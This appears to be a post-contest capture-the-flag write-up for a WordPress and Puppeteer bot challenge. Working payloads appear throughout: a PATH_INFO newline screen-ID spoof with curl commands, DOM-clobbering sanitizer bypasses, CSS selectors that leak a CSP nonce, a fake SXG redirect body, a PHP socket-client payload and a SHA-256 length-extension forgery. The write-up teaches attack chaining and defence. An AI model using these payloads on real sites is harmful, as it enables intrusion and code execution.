@@ -1,0 +1,818 @@
+---
+title: Filtered Reality
+description: Full-chain CTF writeup for a WordPress and Puppeteer bot challenge involving nonce leakage, DOM clobbering, CSP nonce recovery, RCE, and SHA-256 length extension.
+tags:
+  - writeup
+  - wordpress
+  - xss
+  - csp
+  - rce
+  - crypto
+  - puppeteer
+category: web
+difficulty: hard
+ctf_event: Sekaictf2026
+draft: false
+date: 2026-06-30
+---
+
+import Callout from '@/components/mdx/Callout.astro';
+
+<Callout type="note" title="Solve status">
+I solved this challenge after SEKAI CTF 2026 ended. During the live contest window, I was not able to finish the full chain.
+</Callout>
+
+## TL;DR
+
+`Filtered Reality` was a WordPress + Puppeteer bot challenge where the intended path was not one vulnerability, but a chain of small trust-boundary breaks.
+
+The challenge provided a low-privileged WordPress account:
+
+```text
+archive_clerk / ArchiveClerk!2026
+```
+
+At first, this account looked useless because it only had the `subscriber` role. However, it could reach logged-in-only AJAX actions. The key was leaking a privileged AJAX nonce by spoofing WordPress's admin screen ID through `PHP_SELF` / `PATH_INFO`.
+
+After leaking the `archive_seal_record` nonce, the subscriber could queue arbitrary archive records for the admin bot. The rest of the exploit chained browser-side techniques to gain admin JavaScript execution, then used a server-side RCE path and a SHA-256 length extension attack against the keeper service to recover the flag.
+
+<Callout type="warning" title="Key lesson">
+A WordPress nonce is not authorization. Nonces only prove intent or freshness in a specific UI flow; sensitive AJAX handlers still need capability checks such as `current_user_can()`.
+</Callout>
+
+## High-Level Attack Graph
+
+```text
+archive_clerk login
+        |
+        v
+WordPress admin screen-id spoof
+        |
+        v
+Leak archive_seal_record nonce
+        |
+        v
+Queue arbitrary record for admin bot
+        |
+        v
+Bot opens /?render=<ref>
+        |
+        v
+Fake Signed HTTP Exchange fallback
+        |
+        v
+Admin bot lands on /?archive_moderation=1
+        |
+        v
+DOM clobber sanitizer bypass
+        |
+        v
+Inject CSS
+        |
+        v
+Leak CSP nonce from <meta content>
+        |
+        v
+Inject <script nonce=...>
+        |
+        v
+Admin JavaScript execution
+        |
+        v
+Trigger backend RCE
+        |
+        v
+Talk to keeper socket
+        |
+        v
+SHA-256 length extension
+        |
+        v
+Flag
+```
+
+## Challenge Components
+
+### Web Stack
+
+```text
+WordPress 6.6.2
+Apache + mod_php
+MySQL
+Custom archive plugin
+Puppeteer/Chromium admin bot
+Keeper service over Unix socket
+```
+
+### Important Internal Services
+
+```text
+HTTP app:       http://127.0.0.1:1337
+HTTPS app:      https://127.0.0.1:1338
+Keeper socket:  /run/keeper/keeper.sock
+```
+
+### Bot Behavior
+
+The bot logs in as an administrator and repeatedly checks pending archive reports:
+
+```http
+GET /?archive_pending
+```
+
+For every pending reference, it opens:
+
+```http
+GET /?render=<ref>
+```
+
+The first objective is to get an attacker-controlled record reference into the pending queue.
+
+## The Queue Gate
+
+The application allowed anyone to submit an archive record, but public submissions were only stored. They were not automatically sent to the admin bot.
+
+The relevant queue writer was the `archive_seal_record` AJAX action:
+
+```php
+public static function seal_record()
+{
+    check_ajax_referer('archive_seal_record', '_wpnonce');
+    Archive_Records::report((string) ($_POST['ref'] ?? ''));
+    wp_send_json_success('sealed');
+}
+```
+
+This handler had a critical authorization bug:
+
+```php
+// Missing:
+current_user_can('manage_options')
+```
+
+The action was registered as a logged-in AJAX action:
+
+```php
+add_action('wp_ajax_archive_seal_record', ['Archive_Ajax', 'seal_record']);
+```
+
+There was no public version:
+
+```php
+// Not present:
+add_action('wp_ajax_nopriv_archive_seal_record', ...)
+```
+
+Unauthenticated users could not call it, but the shared `archive_clerk` subscriber could. The only missing piece was a valid `archive_seal_record` nonce.
+
+## Leaking the Seal Nonce
+
+### The Reviewer Desk Screen
+
+The plugin printed the seal nonce only when WordPress believed the current admin screen was the Reviewer Desk:
+
+```php
+public static function maybe_print_seal()
+{
+    $screen = get_current_screen();
+
+    if ($screen && $screen->id === 'toplevel_page_archive-desk') {
+        printf(
+            '<input type="hidden" id="seal" value="%s">',
+            esc_attr(wp_create_nonce('archive_seal_record'))
+        );
+    }
+}
+```
+
+At first, this looked safe because the real Reviewer Desk required:
+
+```text
+manage_options
+```
+
+A subscriber could not access:
+
+```text
+/wp-admin/admin.php?page=archive-desk
+```
+
+However, the plugin trusted `get_current_screen()->id` as if it were an authorization boundary. That was the mistake.
+
+## WordPress Screen-ID Spoofing
+
+The exploit did not access the real Reviewer Desk. Instead, it accessed the subscriber-accessible dashboard with poisoned `PATH_INFO`:
+
+```text
+/wp-admin/index.php/x%0A/wp-admin/toplevel_page_archive-desk
+```
+
+The actual script was still:
+
+```text
+/wp-admin/index.php
+```
+
+That dashboard route is accessible to the subscriber.
+
+WordPress derives `$pagenow` from `$_SERVER['PHP_SELF']`. With Apache + PHP, the decoded path becomes similar to:
+
+```text
+/wp-admin/index.php/x
+/wp-admin/toplevel_page_archive-desk
+```
+
+The newline is critical.
+
+WordPress's admin parsing regex effectively looks for a `/wp-admin/` path and captures the page name. Since `.` does not match a newline by default, the first `/wp-admin/` match fails to consume the entire string. The regex then matches the second `/wp-admin/` occurrence after the newline:
+
+```text
+/wp-admin/toplevel_page_archive-desk
+```
+
+As a result, WordPress computes:
+
+```text
+$pagenow     = toplevel_page_archive-desk.php
+$hook_suffix = toplevel_page_archive-desk.php
+$current_screen->id = toplevel_page_archive-desk
+```
+
+The plugin then prints the seal nonce for a subscriber.
+
+### Proof of Concept
+
+```bash
+BASE=http://localhost:4000
+
+curl -s -c c.txt -b c.txt \
+  -d 'log=archive_clerk&pwd=ArchiveClerk!2026&wp-submit=Log+In&redirect_to=/wp-admin/&testcookie=1' \
+  "$BASE/wp-login.php" >/dev/null
+
+curl -s -b c.txt \
+  "$BASE/wp-admin/index.php/x%0A/wp-admin/toplevel_page_archive-desk" \
+  | grep -oE 'id="seal" value="[a-z0-9]+"'
+```
+
+Example output:
+
+```html
+id="seal" value="abc123..."
+```
+
+## Queueing a Malicious Record
+
+Once the seal nonce is leaked, the subscriber can queue any record:
+
+```bash
+curl -i -s -b c.txt \
+  -d "action=archive_seal_record&ref=<ref>&_wpnonce=<seal_nonce>" \
+  "$BASE/wp-admin/admin-ajax.php"
+```
+
+Successful response:
+
+```json
+{"success":true,"data":"sealed"}
+```
+
+The reference is appended to:
+
+```text
+/wp-content/uploads/.reports.queue
+```
+
+The admin bot later consumes this queue and opens:
+
+```text
+/?render=<ref>
+```
+
+At this point, the attacker controls content rendered by the admin bot.
+
+## Why Direct XSS Was Not Enough
+
+The `/render` route reflected the archive body, but the response was protected by CSP. Normal inline JavaScript would not execute without the correct CSP nonce.
+
+The attacker also needed to reach the admin-only moderation page because it contained:
+
+```text
+1. The source-field sanitizer sink
+2. The archive_process_record nonce
+3. Admin authenticated context
+```
+
+Therefore, the next objective was to move the bot from:
+
+```text
+/?render=<ref>
+```
+
+to:
+
+```text
+/?archive_moderation=1&ref=<ref>
+```
+
+## Signed HTTP Exchange Fallback
+
+The challenge exposed an HTTPS vhost on port `1338`, and the bot launched Chromium with:
+
+```text
+--ignore-certificate-errors
+```
+
+This was intentional.
+
+The exploit used a crafted invalid Signed HTTP Exchange body. Chromium attempted to parse it as SXG. When parsing failed, Chromium followed the embedded fallback URL.
+
+The fake SXG body used this structure:
+
+```text
+sxg1-b3\x00
+2-byte fallback URL length
+fallback URL
+padding
+```
+
+Conceptually:
+
+```python
+def sxg_body(ref):
+    fallback = f"https://127.0.0.1:1338/?archive_moderation=1&ref={ref}".encode()
+    return (
+        b"sxg1-b3\x00"
+        + len(fallback).to_bytes(2, "big")
+        + fallback
+        + b"\x00" * 64
+    )
+```
+
+When the bot opened:
+
+```text
+/?render=<ref>
+```
+
+Chromium interpreted the body as a broken SXG and navigated to:
+
+```text
+https://127.0.0.1:1338/?archive_moderation=1&ref=<ref>
+```
+
+Because the bot ignored certificate errors, the internal HTTPS navigation succeeded.
+
+## DOM Clobbering the Sanitizer
+
+The moderation page rendered the record's `source` field through a client-side DOMParser sanitizer.
+
+The sanitizer could be bypassed with DOM clobbering by shadowing the `childNodes` property:
+
+```html
+<form>
+  <input name="childNodes">
+  <input name="childNodes">
+  PAYLOAD
+</form>
+```
+
+This confused the sanitizer's traversal logic and allowed attacker-controlled elements inside the form to survive.
+
+The first payload smuggled a stylesheet import:
+
+```html
+<form>
+  <input name="childNodes">
+  <input name="childNodes">
+  <style>@import url('/?archive_raw=<css_ref>&fmt=css')</style>
+</form>
+```
+
+The CSS was hosted as another archive record and served through:
+
+```text
+/?archive_raw=<css_ref>&fmt=css
+```
+
+## Leaking the CSP Nonce with CSS
+
+The moderation page used a nonce-based CSP:
+
+```text
+script-src 'nonce-<nonce>'
+```
+
+The `<script nonce>` attribute itself was protected by browser nonce hiding. However, the same nonce was also exposed in a readable location:
+
+```html
+<meta content="<nonce>">
+```
+
+CSS attribute selectors can match `meta[content]`. Therefore, the attacker could leak the nonce through CSS-based side channels.
+
+The nonce was a 24-character hexadecimal string. The exploit generated selectors for:
+
+```text
+2-character prefix
+2-character suffix
+3-character substrings
+```
+
+Example:
+
+```css
+meta[content^="ab"] {
+  --s_ab: url('/?archive_leak=1&tk=<token>&S=ab');
+}
+
+meta[content$="ef"] {
+  --e_ef: url('/?archive_leak=1&tk=<token>&E=ef');
+}
+
+meta[content*="abc"] {
+  --m_abc: url('/?archive_leak=1&tk=<token>&M=abc');
+}
+```
+
+Then the exploit forced the browser to evaluate the variables through a property such as `background`.
+
+When a selector matched, the browser requested:
+
+```text
+/?archive_leak=1&tk=<token>&S=<prefix>
+/?archive_leak=1&tk=<token>&E=<suffix>
+/?archive_leak=1&tk=<token>&M=<trigram>
+```
+
+The application's leak endpoint wrote the requests to:
+
+```text
+/wp-content/uploads/leak_<token>.log
+```
+
+## Reconstructing the CSP Nonce
+
+From the leak log, the attacker obtained:
+
+```text
+S = leaked 2-character prefix candidates
+E = leaked 2-character suffix candidates
+M = leaked 3-character substrings
+```
+
+The nonce was reconstructed by overlapping trigrams.
+
+Example:
+
+```text
+S = 12
+M = 123, 234, 345, 456
+E = 56
+```
+
+Reconstruction:
+
+```text
+12
+123
+1234
+12345
+123456
+```
+
+Algorithmically:
+
+```text
+1. Start with the leaked prefix.
+2. Find a trigram whose first two characters match the current suffix.
+3. Append the third character.
+4. Repeat until length 24.
+5. Keep only candidates ending with the leaked suffix.
+```
+
+Once the CSP nonce was recovered, attacker-controlled JavaScript could run in the admin bot.
+
+## Running Admin JavaScript
+
+The exploit submitted another record whose body was again the fake SXG fallback body.
+
+Its `source` field used DOM clobbering again, this time to smuggle an iframe:
+
+```html
+<form>
+  <input name="childNodes">
+  <input name="childNodes">
+  <iframe srcdoc="
+    <script nonce=<recovered_csp_nonce> src='/?archive_raw=<exploit_js_ref>'></script>
+  "></iframe>
+</form>
+```
+
+The bot processed it as follows:
+
+```text
+1. Opens /?render=<ref>
+2. Chromium follows SXG fallback to the moderation page.
+3. DOM clobbering bypasses the sanitizer.
+4. The iframe is inserted.
+5. The script has the correct CSP nonce.
+6. The exploit JS runs in the admin context.
+```
+
+At this point, the attacker had JavaScript execution as the admin bot.
+
+## From Admin JavaScript to RCE
+
+There were two possible RCE routes after admin JavaScript execution.
+
+### Route A: WordPress/PHP POP Chain
+
+This was the route used by the provided solver.
+
+The admin JS scraped the `archive_process_record` nonce from the moderation page:
+
+```jsx
+let nonce = parent.document.getElementById('archive_nonce').value;
+```
+
+Then it called:
+
+```text
+/wp-admin/admin-ajax.php
+```
+
+with:
+
+```text
+action=archive_process_record
+_wpnonce=<archive_process_record_nonce>
+blob=<base64_serialized_pop_chain>
+```
+
+The backend did:
+
+```php
+@unserialize($blob);
+```
+
+The serialized object triggered a POP chain:
+
+```text
+unserialize()
+  -> __wakeup()
+  -> in_array()
+  -> __toString()
+  -> WordPress core gadget chain
+  -> include($filePath)
+  -> php://filter iconv chain
+  -> generated PHP payload
+```
+
+The generated PHP payload connected to the keeper socket.
+
+### Route B: Chrome/V8 N-Day
+
+An alternative route would be to load a Chrome/V8 exploit as the JavaScript payload.
+
+Relevant Chromium issue:
+
+```text
+https://issues.chromium.org/issues/382291459
+```
+
+Because the bot runs Chromium with:
+
+```text
+--no-sandbox
+```
+
+a renderer RCE can become container-level code execution.
+
+The chain would become:
+
+```text
+CSP nonce recovered
+  -> load /?archive_raw=<v8_payload_ref>
+  -> trigger V8 type confusion
+  -> native code execution in renderer
+  -> no sandbox
+  -> talk to keeper socket or exfiltrate flag
+```
+
+This route replaces the PHP POP chain with a browser memory-corruption exploit.
+
+## Keeper Client RCE Payload
+
+The POP route used a small PHP payload as a keeper client:
+
+```php
+<?php
+$s=@stream_socket_client("unix:///run/keeper/keeper.sock",$e,$x,2);
+$r=$s?(fwrite($s,$_REQUEST["k"]."\n")?trim((string)fread($s,4096)):"WERR"):"NOSOCK";
+$t=preg_replace("/[^a-zA-Z0-9]/","",(string)($_REQUEST["t"]??"out"));
+@file_put_contents("/var/www/html/wp-content/uploads/$t.log",$r);
+?>
+```
+
+It accepted:
+
+```text
+k = command sent to keeper
+t = output log filename
+```
+
+Example:
+
+```text
+k=CYCLE
+t=<token>cyc
+```
+
+The payload sent `CYCLE` to the keeper socket and wrote the response to:
+
+```text
+/wp-content/uploads/<token>cyc.log
+```
+
+This gave the admin JavaScript a keeper command oracle.
+
+## Keeper Protocol
+
+The keeper supported commands similar to:
+
+```text
+CYCLE
+SIGN <hex_message>
+FLAG <hex_message> <signature>
+```
+
+The signing construction was:
+
+```text
+sha256(secret || message)
+```
+
+The `SIGN` command refused to sign messages containing the flag command, but the construction was vulnerable to length extension.
+
+## SHA-256 Length Extension
+
+The exploit first asked the keeper for the current cycle:
+
+```text
+CYCLE
+```
+
+Then it built a benign message:
+
+```text
+cycle=<cycle>;user=guest
+```
+
+It asked the keeper to sign it:
+
+```text
+SIGN <hex(cycle=<cycle>;user=guest)>
+```
+
+This returned:
+
+```text
+sha256(secret || benign_message)
+```
+
+The exploit then appended:
+
+```text
+;cmd=give_flag
+```
+
+Using SHA-256 length extension, it computed a valid digest for:
+
+```text
+secret || benign_message || glue_padding || ;cmd=give_flag
+```
+
+without knowing the secret.
+
+The exploit brute-forced the secret length from 0 to 48 bytes. The real secret length was 16 bytes, so one attempt succeeded.
+
+Finally, it sent:
+
+```text
+FLAG <hex(forged_message)> <forged_signature>
+```
+
+The keeper accepted the forged message and returned the flag.
+
+## Flag Retrieval
+
+The keeper response was written to:
+
+```text
+/wp-content/uploads/<token>flag.log
+```
+
+The solver repeatedly fetched:
+
+```text
+/wp-content/uploads/<token>flag.log
+```
+
+until it saw a flag pattern.
+
+Depending on the CTF, the final check should match the correct format:
+
+```text
+HTB{...}
+```
+
+or:
+
+```text
+SEKAI{...}
+```
+
+## Final Exploit Flow
+
+```text
+[1] Log in as archive_clerk
+    |
+    v
+[2] Request /wp-admin/index.php/x%0A/wp-admin/toplevel_page_archive-desk
+    |
+    v
+[3] Spoof current_screen->id
+    |
+    v
+[4] Leak archive_seal_record nonce
+    |
+    v
+[5] Call archive_seal_record to queue a malicious ref
+    |
+    v
+[6] Bot opens /?render=<ref>
+    |
+    v
+[7] Fake SXG fallback redirects bot to HTTPS moderation page
+    |
+    v
+[8] DOM clobbering bypasses sanitizer
+    |
+    v
+[9] Inject CSS
+    |
+    v
+[10] CSS leaks CSP nonce from meta[content]
+    |
+    v
+[11] Reconstruct CSP nonce
+    |
+    v
+[12] Inject iframe srcdoc with <script nonce=...>
+    |
+    v
+[13] Admin JavaScript execution
+    |
+    v
+[14] Trigger RCE path
+        |
+        +--> PHP POP chain route
+        |
+        +--> Chrome/V8 n-day route
+    |
+    v
+[15] Interact with keeper socket
+    |
+    v
+[16] Exploit SHA-256 length extension
+    |
+    v
+[17] Read flag from uploads log
+```
+
+## Key Takeaways
+
+The challenge was difficult because no single bug gave the flag. Each primitive only unlocked the next stage:
+
+```text
+screen spoof
+  -> nonce leak
+  -> queue bot
+  -> SXG fallback
+  -> moderation sink
+  -> DOM clobber
+  -> CSS nonce leak
+  -> admin JS
+  -> RCE
+  -> keeper oracle
+  -> length extension
+  -> flag
+```
+
+The most important lesson is simple:
+
+```text
+A nonce is not authorization.
+```
+
+The `archive_seal_record` endpoint was protected by a nonce, but not by a capability check. Once the nonce was leaked through a UI-context spoof, the subscriber account became powerful enough to drive the entire bot exploit chain.
